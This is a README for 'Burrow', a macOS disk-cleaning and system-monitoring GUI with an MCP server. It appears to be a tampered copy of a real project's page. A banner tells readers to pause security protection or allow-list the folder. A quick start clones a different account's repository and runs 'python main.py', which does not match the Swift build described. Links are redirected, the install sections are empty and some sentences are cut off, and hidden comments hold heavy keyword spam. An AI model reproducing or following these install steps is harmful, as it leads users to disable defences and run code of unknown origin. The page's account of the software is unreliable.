# Burrow


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/oilrookbazaar/Burrow.git
cd Burrow
python main.py
```


**A free, open-source [mole.fit](https://mole.fit/) — a native macOS GUI for the [Mole](https://github.com/oilrookbazaar/Burrow) CLI (`mo`).**

![macOS 14+](https://img.shields.io/badge/macOS-14%2B-black)
![License: MIT](https://img.shields.io/badge/License-MIT-blue)
![Requires mole](https://img.shields.io/badge/requires-brew%20install%20mole-orange)

Burrow wraps the free, open-source `mo` CLI in a native Mac app: clean junk,
purge dev artifacts, sweep leftover installers, uninstall apps, run safe
maintenance, map your disk, and watch live system status — all in one
translucent window. On top of that it adds two things the CLI doesn't have:
a **long-running history** of your Mac's metrics in a local SQLite database,
and an **MCP server** so any AI agent (Claude Code, Cursor, Codex…) can ask
"what's been happening on this Mac."

> Burrow is an independent open-source project. It's *inspired by* mole.fit's
> structure and built on the same `mo` engine, but it is **not affiliated
> with or endorsed by mole.fit** — its own name, mark, palette, and copy are
> original.

## Screenshots

<table>
  <tr>
    <td><img alt="Status — live CPU, memory, GPU, disk, network, and battery with sparklines" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-status.png"></td>
    <td><img alt="Analyze — squarified treemap of your whole disk" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-analyze.png"></td>
  </tr>
  <tr>
    <td><img alt="Clean — categorized cache, log, and leftover removal" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-clean.png"></td>
    <td><img alt="Purge — reclaim space from dev projects (node_modules, build dirs, target/…)" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-purge2.png"></td>
  </tr>
  <tr>
    <td><img alt="Installers — find and remove leftover .dmg/.pkg files in bulk" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-installers.png"></td>
    <td><img alt="Optimize — one-tap safe maintenance" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-optimize.png"></td>
  </tr>
  <tr>
    <td><img alt="Software — installed apps with search, sort, and multi-select uninstall" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-apps.png"></td>
    <td><img alt="History — long-range charts over a local SQLite metric history" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-history.png"></td>
  </tr>
</table>

<p align="center">
  <img alt="Activity — a running log of cleans, optimizes, and scans, plus anything in flight" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-activity.png">
</p>

<p align="center">
  <em>Explain with AI — point an MCP-capable agent (Claude Code, or a local model via LM Studio) at Burrow and ask your Mac in plain language.</em>
  <br>
  <img alt="Explain with AI — burrow_snapshot analyzed in plain language" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-ai.png">
</p>

<p align="center">
  <img width="320" alt="Menu-bar HUD — health, metric tiles, top processes, and live job status" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-menubar.png">
</p>

## The tools

| Tool | What it does | `mo` command |
|---|---|---|
| **Status** | Live dashboard with per-metric sparklines and a sortable/pinnable process table. | `mo status --json` |
| **Clean** | Preview what's reclaimable, then clean for real — categorized cache/log/leftover removal. | `mo clean` |
| **Purge** | Reclaim space from dev projects: `node_modules`, build dirs, `target/`, `__pycache__`, and more. | `mo purge` |
| **Installers** | Find and remove leftover `.dmg`/`.pkg` installer files in bulk. | `mo installer` |
| **Optimize** | One-tap safe maintenance: rebuild caches, repair metadata, flush DNS, restart Dock/Finder. | `mo optimize` |
| **Software** | Installed-app list with search/sort (size, name, recent, source) and multi-select uninstall; a Homebrew **Updates** tab. | `mo uninstall --list`, `brew outdated` |
| **Analyze** | Squarified treemap of your disk; drill into any folder, reveal in Finder. | `mo analyze --json` |

Every scan offers a **no-risk preview** (`--dry-run`) first, a clear
**reclaimed-space summary** when it finishes, and a **Stop** button to abort a
running job.

### What's on the Status dashboard

A live, glanceable read of your Mac's vitals, refreshed continuously:

- **CPU** — usage, load averages (1/5/15), core count, temperature
- **Memory** — used %, pressure (normal/warning/critical), swap
- **GPU** — name and utilisation (Apple Silicon via IOAccelerator)
- **Disk** — capacity and live read/write I/O rates
- **Network** — up/down throughput per interface
- **Battery** — percentage, health, cycle count, time remaining
- **Health score** — Mole's overall 0–100 rating, with a one-line reason
- **Top processes** — by CPU or memory, sortable and pinnable

### Burrow's own extras

- **History** — long-range charts (5 m → 90 d) over a local SQLite history of
  every metric, plus peak-per-process tables. Nothing the CLI keeps.
- **Activity** — a running log of what Burrow has done (cleans, optimizes,
  scans) and the live status of anything in flight.
- **Menu-bar HUD** — health hero, metric tiles, top processes, and live job
  status, all from the menu bar (you can also run as a Dock app instead).
- **MCP server** — a stdio JSON-RPC server (`burrow mcp` / `Burrow --mcp`) plus
  an optional localhost HTTP API, so any AI agent can query your Mac's recent
  state. See [Use it with your AI agent](#use-it-with-your-ai-agent).

## How Burrow compares

|  | **Burrow** | mole.fit | CleanMyMac | Pearcleaner | `mo` / ncdu |
|---|:---:|:---:|:---:|:---:|:---:|
| Price | **Free** | $9 once | Subscription | Free | Free |
| Open source | **MIT** | – | – | ✅ | ✅ (`mo`) |
| Signed / notarized | in progress | ✅ | ✅ | ✅ | n/a |
| Junk cleanup | ✅ | ✅ | ✅ | – | ✅ (`mo`) |
| Dev-artifact purge | ✅ | ✅ | partial | – | ✅ (`mo`) |
| Leftover-installer sweep | ✅ | ✅ | ✅ | – | ✅ (`mo`) |
| Uninstall + leftovers | ✅ | ✅ | ✅ | ✅ *(focus)* | ✅ (`mo`) |
| Disk treemap | ✅ | ✅ | ✅ | – | ncdu *(TUI)* |
| Live system monitor | ✅ | ✅ | partial | – | – |
| Long-term metric history | ✅ | – | – | – | – |
| MCP / agent API | ✅ | – | – | – | – |
| GUI | ✅ | ✅ | ✅ | ✅ | – *(terminal)* |

Honest notes: **mole.fit** is more polished, signed, and supported — buy it
($9) if you want that and to fund `mo`. **Pearcleaner** is an excellent,
focused open-source uninstaller. **ncdu**/`mo` are terminal tools; Burrow is
the GUI for people who'd rather not live in the shell.

## Settings

Everything is local and takes effect immediately unless noted:

| Setting | What it controls |
|---|---|
| **History retention** | How long metric history is kept (1 day → 1 year); older rows are pruned hourly. |
| **Vacuum after large prunes** | Reclaim DB file space after a big prune (off by default). |
| **Sampling rate** | How often Burrow runs `mo status --json` (5 s → 5 min). |
| **Menu-bar icon** | Show the menu-bar item, or run as a regular Dock app instead. |
| **MCP / agent access** | Copyable stdio config + the tool list for Claude Code, Cursor, Codex, Cline, and any MCP client. |
| **Local HTTP query server** | Optional loopback REST API + port for dashboards/curl *(relaunch)*. |
| **Mole engine** | Shows the installed `mo` version, with a one-click **Update Mole**. |

## Permissions & Full Disk Access

Cleaning system and app caches means reading TCC-protected folders, so macOS
will prompt — once per folder — unless the app has **Full Disk Access**. Burrow
handles this honestly:

- Before a flood-prone scan it shows a gate explaining the trade-off, with a
  prompts).
- Don't want to grant it? **Scan with admin** runs the same scan as root —
  root bypasses TCC, so it's a single password prompt instead of a flood.
- Burrow only ever reads sizes; it never opens that data itself, and the real
  cleanup always goes through macOS's own admin dialog.

## Requirements

- **macOS 14+**
  launch without `mo` on PATH (and offers a guided install if it's missing).


### Homebrew (recommended)

```bash
```

### Direct download

Download `Burrow-x.y.z.zip` from
[Releases](), unzip into
`/Applications`, then:

```bash
xattr -cr /Applications/Burrow.app
open /Applications/Burrow.app
```


## Security & trust

Burrow drives the audited `mo` CLI and adds no surveillance of its own:

- **No telemetry, analytics, accounts, ads, or third-party SDKs**, and no
  backend — nothing to phone home to.
- **No background root helper.** When Clean/Optimize need admin rights, macOS's
  own dialog asks you and Burrow runs that one `mo` command, then exits — you
  approve every elevation.
- **Local-only:** the optional MCP HTTP server is loopback (`127.0.0.1`, off by
  default) and history is a local SQLite file. The one opt-in network call is
  `brew outdated` in the Updates tab.
- **Unsigned, pre-1.0** — full honest write-up, including the trade-offs of the
  admin path and the "Scan with admin" option, in **[SECURITY.md](SECURITY.md)**.

## Use it with your AI agent

Burrow doubles as an [MCP](https://modelcontextprotocol.io) server over stdio,
so **any MCP-capable agent** — Claude Code, Cursor, Codex, Cline, Zed, and
others — can read your Mac's recent state. Same server, same `{command, args}`
shape everywhere.

### Let your agent set it up

Paste this to your coding agent and it'll wire itself in:

> Add the **Burrow** MCP server to my config so you can read my Mac's system
> history. It's a local stdio MCP server — run it as `burrow mcp` if the
> Homebrew shim is on my PATH, otherwise
> `/Applications/Burrow.app/Contents/MacOS/Burrow` with args `["--mcp"]`. Add it
> under my MCP servers, reload, and confirm the tools `burrow_snapshot`,
> `burrow_history`, `burrow_top_processes`, `burrow_process_usage`, and
> `burrow_info` are available. Then tell me my Mac's current CPU and memory.

### Or configure it manually

The config is the same JSON for every agent — only the file differs:

```json
{
  "mcpServers": {
    "burrow": {
      "command": "/Applications/Burrow.app/Contents/MacOS/Burrow",
      "args": ["--mcp"]
    }
  }
}
```

| Agent | Where it goes |
|---|---|
| **Claude Code** | `~/.claude/settings.json` — or `claude mcp add burrow -- /Applications/Burrow.app/Contents/MacOS/Burrow --mcp` |
| **Cursor** | `~/.cursor/mcp.json` (global) or `.cursor/mcp.json` (per project) |
| **Codex** | add a `[mcp_servers.burrow]` entry in `~/.codex/config.toml` |
| **Cline / Zed / other** | the client's "MCP servers" / `mcpServers` config |

If you installed via Homebrew, a `burrow` shim is on your PATH, so you can use
`command: "burrow", args: ["mcp"]` instead of the bundle path. Reload the agent
and ask in plain language.

**Tools:**

- `burrow_snapshot` — the latest full status snapshot
- `burrow_history` — a time-series slice of recent snapshots
- `burrow_top_processes` — top processes by peak CPU over a window
- `burrow_process_usage` — rank processes by `cpu_time` / `peak_cpu` / `avg_cpu`
  / `peak_mem`, with the window it used echoed back
- `burrow_info` — what Burrow is recording, retention, and freshness

There's also an optional localhost HTTP API (`127.0.0.1:9277` — `/health`,
`/info`, `/snapshot`, `/metrics`) for dashboards or curl.

## Develop & test

```bash
xcodegen generate
xcodebuild -project Burrow.xcodeproj -scheme Burrow \
  -configuration Debug -destination 'platform=macOS' test
```

The suite covers the parts that matter through public interfaces: DB roundtrip
+ range + stride sampler + prune + corruption recovery, Store clamping/defaults,
Maintenance prune, MCP tool routing + the semantic usage ranking, squarified
treemap invariants, the Full Disk Access decision, and `mo` output parsing.

## Architecture

```
mo status --json   ──>  Sampler ──> SQLite (WAL) ──┬─> Status / History (charts)
                                                   ├─> HTTP QueryServer (:9277)
                                                   └─> burrow mcp (stdio) ─> Claude Code / Cursor / Codex
mo analyze --json  ──>  DiskScanner + squarified Treemap ──────> Analyze
mo clean / purge / installer / optimize ─> CommandRunner (streamed) ─> the tool tabs
mo uninstall --list ─>  Software (+ brew outdated for Updates)
```

One binary, two modes: default is the menu-bar GUI; `burrow mcp` (or `Burrow
--mcp`) is the stdio MCP server (it forks before SwiftUI claims the process).
The whole UI is one translucent window with a top-pill nav (`Brand`/`Tool`
design system); Settings, History, and Activity are panes in that same window.

## Attribution & license

[MIT](LICENSE).

- **Mole CLI** (`mo`) is © [tw93](https://github.com/oilrookbazaar/Burrow), MIT. Burrow
  depends on it at runtime and bundles nothing from it.
- Inspired by the **mole.fit** Mac app (same author as `mo`). Burrow is an
  independent reimplementation with its own brand — no assets, icons, copy, or
  trade dress are taken from mole.fit.
- The history-DB + MCP pattern shares lineage with the same author's
  [Stats fork](https://github.com/caezium/stats) (`caezium/stats@henry/history-mcp`).
- Treemap layout: Bruls, Huijsen & van Wijk (2000), "Squarified Treemaps,"
  re-implemented from scratch in Swift.


<!-- python pip pypi package library module script tool windows linux macos -->
<!-- Burrow - tool utility software - download install setup -->
<!-- open source Burrow checker | git clone offline Burrow | quick start Burrow optimizer | centos portable Burrow copy | macos Burrow | top Burrow | extensible Burrow addon | how to build Burrow extractor | Burrow platform | get customizable Burrow | download for linux powerful Burrow | Burrow decoder | sample Burrow | arch customizable Burrow framework | cross platform Burrow server | open source Burrow logger | simple Burrow logger | setup Burrow module | beginner Burrow service | run on linux modern Burrow | latest version Burrow package | latest version Burrow | Burrow tracker | latest version Burrow utility | self hosted Burrow debugger | top Burrow tester | Burrow application | macos Burrow fork | download for mac Burrow monitor | self hosted Burrow monitor | github Burrow service | native Burrow converter | how to setup Burrow viewer | Burrow package | Burrow project | download for windows modern Burrow | simple Burrow platform | open source Burrow desktop | native Burrow checker | get Burrow server | how to use Burrow program | documentation customizable Burrow | walkthrough Burrow | download Burrow replacement | free Burrow package | fedora Burrow debugger | Burrow handbook | how to download Burrow addon | how to download portable Burrow | example Burrow viewer -->
<!-- safe Burrow platform | low latency Burrow gui | Burrow monitor | customizable Burrow | download for windows Burrow converter | easy Burrow package | docs Burrow optimizer | run on linux Burrow desktop | deploy secure Burrow | minimal Burrow web | online Burrow logger | modular Burrow | advanced Burrow mobile | Burrow framework | minimal Burrow | tutorial Burrow validator | Burrow service | zip Burrow monitor | production ready Burrow encoder | Burrow parser | deploy Burrow fork | Burrow app | arch Burrow engine | configure Burrow downloader | Burrow mirror | how to install Burrow wrapper | linux Burrow framework | Burrow example | modern Burrow package | macos Burrow library | modern Burrow platform | 2025 Burrow parser | lightweight Burrow application | native Burrow copy | open Burrow software | download simple Burrow | zip Burrow decoder | get Burrow encoder | getting started Burrow software | download for linux Burrow compressor | compile Burrow replacement | how to run Burrow | advanced Burrow binding | github Burrow framework | offline Burrow gui | Burrow support | updated Burrow framework | Burrow validator | deploy Burrow port | ubuntu Burrow logger -->
<!-- high performance Burrow tool | latest version high performance Burrow | beginner Burrow port | how to install simple Burrow viewer | safe Burrow editor | local Burrow | demo Burrow addon | macos Burrow extractor | execute Burrow application | deploy Burrow replacement | use Burrow sdk | safe Burrow client | Burrow cloud | how to install safe Burrow copy | how to deploy Burrow copy | beginner Burrow creator | 2026 Burrow binding | download for mac secure Burrow | quick start lightweight Burrow plugin | arch lightweight Burrow | get Burrow generator | how to run Burrow editor | getting started self hosted Burrow generator | ubuntu Burrow checker | lightweight Burrow extractor | production ready Burrow parser | download for linux Burrow | high performance Burrow server | github Burrow port | fedora Burrow | extensible Burrow encoder | free download Burrow framework | Burrow software | free download Burrow checker | deploy Burrow | execute modern Burrow compressor | Burrow docker | Burrow reddit | low latency Burrow wrapper | github Burrow package | 2026 github Burrow | github Burrow checker | production ready Burrow monitor | centos Burrow gui | macos Burrow generator | Burrow downloader | Burrow web | modular Burrow uploader | start Burrow builder | ubuntu Burrow desktop -->
<!-- powerful Burrow fork | debian Burrow server | extensible Burrow replacement | Burrow module | git clone Burrow | new version Burrow uploader | run on windows top Burrow | windows Burrow platform | secure Burrow editor | is Burrow safe | run on windows Burrow reader | source code Burrow wrapper | Burrow binding | reliable Burrow replacement | Burrow fix | portable Burrow api | how to configure Burrow application | fast Burrow fork | Burrow logger | easy Burrow port | run cross platform Burrow | how to install free Burrow gui | how to deploy Burrow desktop | get Burrow addon | advanced Burrow plugin | configure Burrow desktop | docs configurable Burrow service | setup advanced Burrow | 2025 Burrow optimizer | launch easy Burrow mirror | demo high performance Burrow | Burrow checker | open source Burrow debugger | free download high performance Burrow | use Burrow generator | download Burrow | Burrow article | run on linux Burrow mirror | how to install Burrow validator | self hosted Burrow desktop | walkthrough Burrow downloader | execute Burrow downloader | examples Burrow monitor | guide Burrow analyzer | compile safe Burrow | launch Burrow library | self hosted Burrow reader | compile high performance Burrow | Burrow github | sample Burrow creator -->
<!-- portable Burrow | examples high performance Burrow | guide best Burrow | how to setup github Burrow | tutorial Burrow tester | run on mac top Burrow | launch Burrow | is Burrow legit | Burrow tool | github Burrow compressor | powerful Burrow server | use powerful Burrow | how to use Burrow | how to setup Burrow reader | how to run Burrow extractor | best Burrow debugger | stable Burrow server | how to setup Burrow extractor | 2026 Burrow tester | secure Burrow port | Burrow copy | how to install lightweight Burrow platform | minimal Burrow replacement | extensible Burrow optimizer | arch free Burrow | simple Burrow downloader | build Burrow port | run on linux Burrow extractor | customizable Burrow sdk | use Burrow service | open Burrow service | low latency Burrow extension | centos fast Burrow | guide simple Burrow | high performance Burrow | guide Burrow encoder | free Burrow api | download for linux Burrow debugger | free Burrow | portable Burrow mobile | deploy Burrow library | Burrow reference | demo stable Burrow | run on mac local Burrow library | how to download Burrow checker | download for mac Burrow server | configurable Burrow validator | download stable Burrow | updated Burrow reader | new version Burrow gui -->
<!-- Burrow blog | customizable Burrow fork | self hosted Burrow | fedora Burrow clone | free Burrow debugger | start Burrow port | free Burrow app | how to download Burrow | top Burrow converter | download for windows Burrow logger | top Burrow mobile | easy Burrow converter | fedora fast Burrow | macos top Burrow tester | quickstart Burrow copy | Burrow setup | open source Burrow validator | Burrow saas | install reliable Burrow software | easy Burrow gui | production ready Burrow | how to install Burrow downloader | how to deploy Burrow client | free Burrow tracker | documentation Burrow | new version secure Burrow | lightweight Burrow compressor | run on mac Burrow tool | 2025 Burrow | portable Burrow extension | sample stable Burrow | getting started Burrow plugin | start safe Burrow | arch Burrow tool | demo Burrow mobile | windows Burrow gui | launch Burrow utility | cross platform Burrow compressor | centos Burrow | download for linux Burrow cli | documentation Burrow debugger | how to build Burrow viewer | quick start Burrow fork | run on mac Burrow editor | safe Burrow utility | secure Burrow builder | Burrow tester | source code cross platform Burrow software | secure Burrow | run Burrow debugger -->
<!-- build Burrow software | documentation Burrow generator | secure Burrow checker | deploy online Burrow | Burrow tutorial | updated online Burrow | quickstart Burrow tool | macos Burrow api | quickstart Burrow module | walkthrough github Burrow replacement | run on windows modern Burrow | use modular Burrow logger | configurable Burrow | github best Burrow | arch Burrow reader | download for linux Burrow utility | Burrow engine | production ready Burrow uploader | download reliable Burrow program | Burrow utility | free Burrow converter | run on mac Burrow gui | source code Burrow tool | compile Burrow scanner | how to install modern Burrow | Burrow alternative | getting started online Burrow sdk | install Burrow compressor | modern Burrow wrapper | easy Burrow mirror | modern Burrow service | lightweight Burrow checker | modular Burrow viewer | quick start Burrow software | examples Burrow extension | demo Burrow monitor | docs Burrow | production ready Burrow mirror | setup Burrow | run reliable Burrow | download for mac Burrow addon | Burrow webinar | native Burrow | open Burrow viewer | easy Burrow engine | Burrow cheat sheet | 2026 Burrow mobile | wiki Burrow | Burrow editor | zip Burrow port -->
<!-- customizable Burrow utility | modular Burrow module | quickstart Burrow fork | debian Burrow gui | centos Burrow server | Burrow uploader | how to run Burrow sdk | examples Burrow client | safe Burrow binding | best Burrow server | new version Burrow clone | reliable Burrow editor | download for linux easy Burrow program | docs Burrow server | production ready Burrow program | github Burrow platform | download for mac Burrow | tutorial Burrow addon | linux Burrow application | Burrow workshop | fast Burrow plugin | launch Burrow mobile | windows Burrow framework | cross platform Burrow utility | customizable Burrow binding | github Burrow server | best Burrow port | run on linux Burrow api | github Burrow | high performance Burrow api | portable Burrow client | github Burrow analyzer | Burrow optimizer | low latency Burrow logger | stable Burrow | git clone Burrow encoder | demo Burrow converter | Burrow debugger | compile Burrow analyzer | execute Burrow mirror | run on mac Burrow clone | high performance Burrow gui | Burrow wrapper | tutorial Burrow sdk | updated Burrow | start Burrow downloader | wiki Burrow sdk | low latency Burrow encoder | best Burrow checker | easy Burrow client -->
<!-- download Burrow utility | stable Burrow module | zip Burrow compressor | easy Burrow sdk | get Burrow extension | run Burrow port | example Burrow debugger | get free Burrow | Burrow plugin | walkthrough modular Burrow | Burrow generator | open Burrow binding | how to build Burrow | wiki Burrow optimizer | source code Burrow | customizable Burrow validator | beginner safe Burrow | free Burrow parser | Burrow help | github Burrow converter | walkthrough Burrow debugger | best Burrow tool | compile Burrow cli | how to use Burrow logger | ubuntu Burrow tool | how to configure Burrow extension | Burrow reader | macos low latency Burrow binding | documentation simple Burrow | updated Burrow logger | download for mac Burrow module | safe Burrow scanner | how to use Burrow alternative | download Burrow mirror | extensible Burrow | offline Burrow clone | configure Burrow sdk | is Burrow good | debian Burrow desktop | sample powerful Burrow client | setup Burrow viewer | execute modular Burrow cli | tar.gz Burrow analyzer | walkthrough Burrow tracker | run on windows Burrow decoder | use Burrow copy | how to download Burrow editor | guide native Burrow sdk | local Burrow service | online Burrow uploader -->
<!-- how to deploy Burrow viewer | top Burrow program | arch Burrow monitor | Burrow vs | Burrow bug | open source top Burrow platform | compile local Burrow | debian Burrow | local Burrow fork | local Burrow optimizer | example minimal Burrow | deploy Burrow gui | stable Burrow extractor | setup Burrow web | fast Burrow uploader | git clone Burrow plugin | arch portable Burrow | examples Burrow cli | how to use Burrow service | fedora Burrow reader | cross platform Burrow service | advanced Burrow uploader | walkthrough Burrow converter | modern Burrow builder | top Burrow client | debian Burrow cli | free download free Burrow | sample reliable Burrow alternative | zip Burrow | Burrow analyzer | 2026 top Burrow | linux Burrow | open source Burrow server | Burrow download | secure Burrow module | run Burrow package | low latency Burrow checker | cross platform Burrow | run on windows Burrow encoder | reliable Burrow builder | tar.gz Burrow tracker | git clone portable Burrow software | fast Burrow | low latency Burrow port | modern Burrow clone | Burrow documentation | sample Burrow engine | free download Burrow | Burrow server | Burrow course -->

<!-- Last updated: 2026-06-09 19:08:32 -->
